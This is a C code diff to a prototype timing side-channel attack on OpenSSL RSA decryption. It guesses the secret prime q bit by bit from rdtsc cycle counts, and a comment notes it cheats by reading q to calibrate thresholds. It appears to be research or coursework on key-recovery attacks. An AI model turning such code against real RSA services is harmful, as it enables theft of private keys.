@@ -6,9 +6,10 @@
 #include <openssl/bn.h>
 #include <x86intrin.h>
 #include <stdlib.h>
+#include <limits.h>
 //#include "eea.c"
 
-#define ITERATIONS 1000
+#define ITERATIONS 100
 #define NEIGHBORHOOD 512
 
 //#define DEBUG
@@ -29,6 +30,7 @@ void decryptTiming(RSA *rsa, BIGNUM *R, BIGNUM *Rprime, BIGNUM *guess, BIGNUM *g
 	// Loop for timings
         int rsa_size = RSA_size(rsa);
 	for (unsigned long variations = 0; variations < NEIGHBORHOOD; variations++) {
+                // Create guess for the neighborhood variations
                 BN_zero(guessneighbor);
                 BN_set_word(guessneighbor, variations);
                 BN_add(guessneighbor, guess, guessneighbor);
@@ -54,7 +56,7 @@ void decryptTiming(RSA *rsa, BIGNUM *R, BIGNUM *Rprime, BIGNUM *guess, BIGNUM *g
 #endif
 
 		for (int i = 0; i < ITERATIONS; i++) {
-			// Timing code from https://blog.codingconfessions.com/p/rdtsc
+			// Timing code modified from https://blog.codingconfessions.com/p/rdtsc
 			unsigned int auxCPUID1, auxCPUID2;
 			unsigned long long start, end;
 			_mm_lfence();
@@ -87,9 +89,10 @@ void decryptTiming(RSA *rsa, BIGNUM *R, BIGNUM *Rprime, BIGNUM *guess, BIGNUM *g
 			}
 		}
 	}
+        // Sort all results of variations and grab min, median, max, etc.
         qsort(cycles, ITERATIONS * NEIGHBORHOOD, sizeof(unsigned long long), compare_long_long);
 	printf("cycles min, 10th\%tile, median, max:\n");
-        printf("%llu, %llu, %llu, %llu\n", ((unsigned long long *) cycles)[0], ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/19], ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2], ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD-1]);
+        printf("%llu, %llu, %llu, %llu\n", ((unsigned long long *) cycles)[0], ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/10], ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2], ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD-1]);
 
 
 }
@@ -161,8 +164,8 @@ int main()
         BIGNUM *cipherguess = BN_new();
 
         // Instantiate guess with the top hundred or so bits of q
-	BN_rshift(guess, rsa->q, 511);
-	BN_lshift(guess, guess, 511);
+	BN_rshift(guess, rsa->q, 381);
+	BN_lshift(guess, guess, 381);
 
 
 
@@ -174,6 +177,19 @@ int main()
 //      This is the start of actual decryption
 //
 //
+
+unsigned long long lastTime = 0;
+unsigned long long deltaTime;
+unsigned long long storedTimes[mont->ri];
+int countStoredTimes = 0;
+
+for (int i = 0; i < mont->ri; i++) {
+        // Load guess directly from q (this is cheating but important for determining thresholds in prototype)
+        BN_rshift(guess, rsa->q, (mont->ri-i));
+        BN_lshift(guess, guess, (mont->ri-i));
+        // Set the next bit to 1
+        BN_set_bit(guess, mont->ri - 1 - i);
+
         printf("\nq:             ");
 	BN_print_fp(stdout, rsa->q);
 	printf("\n");
@@ -181,39 +197,52 @@ int main()
 	printf("guess:         ");
 	BN_print_fp(stdout, guess);
 	printf("\n");
-decryptTiming(rsa, R, Rprime, guess, guessneighbor, cipherguess, ctx, ciphertext, decrypted, cycles);
-unsigned long long g1 = ((unsigned long long *) cycles)[0];
-unsigned long long g2 = ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2];
-unsigned long long g3 = ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD-1];
-BN_set_bit(guess, 510);
-        printf("\nq:             ");
-	BN_print_fp(stdout, rsa->q);
-	printf("\n");
 
-	printf("guess:         ");
-	BN_print_fp(stdout, guess);
-	printf("\n");
-decryptTiming(rsa, R, Rprime, guess, guessneighbor, cipherguess, ctx, ciphertext, decrypted, cycles);
-unsigned long long g4 = ((unsigned long long *) cycles)[0];
-unsigned long long g5 = ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2];
-unsigned long long g6 = ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD-1];
-BN_set_bit(guess, 509);
-        printf("\nq:             ");
-	BN_print_fp(stdout, rsa->q);
-	printf("\n");
+        // Run guess
+        decryptTiming(rsa, R, Rprime, guess, guessneighbor, cipherguess, ctx, ciphertext, decrypted, cycles);
 
-	printf("guess:         ");
-	BN_print_fp(stdout, guess);
-	printf("\n");
-decryptTiming(rsa, R, Rprime, guess, guessneighbor, cipherguess, ctx, ciphertext, decrypted, cycles);
-unsigned long long g7 = ((unsigned long long *) cycles)[0];
-unsigned long long g8 = ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2];
-unsigned long long g9 = ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD-1];
 
-printf("Final Runtimes:\n");
-printf("%llu, %llu, %llu\n", g1, g2, g3);
-printf("%llu, %llu, %llu\n", g4, g5, g6);
-printf("%llu, %llu, %llu\n", g7, g8, g9);
+
+
+        // Compare timings against all previous small timings
+        deltaTime = ULLONG_MAX;
+        lastTime = 0;
+        
+        for (int j = 0; j < countStoredTimes; j++) {
+                if (storedTimes[j] > ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2]) {
+                        if((storedTimes[j] - ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2]) < deltaTime) {
+                                deltaTime = storedTimes[j] - ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2];
+                                lastTime = storedTimes[j];
+                        }
+                } else {
+                        if((((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2] - storedTimes[j]) < deltaTime) {
+                                deltaTime = ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2] - storedTimes[j];
+                                lastTime = storedTimes[j];
+                        }
+                }
+        }
+
+
+
+
+
+        if (lastTime > ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2]) {
+                printf("+");
+        } else {
+                printf("-");
+        }
+
+        printf("DELTA T (");
+        if (BN_cmp(guess, rsa->q) == 1) {
+                printf("Big): ");
+        } else {
+                printf("Small): ");
+                storedTimes[countStoredTimes] = ((unsigned long long *) cycles)[ITERATIONS*NEIGHBORHOOD/2];
+                countStoredTimes += 1;
+        }     
+        printf("%llu from prevTime %llu\n", deltaTime, lastTime);
+}
+
 
 
 
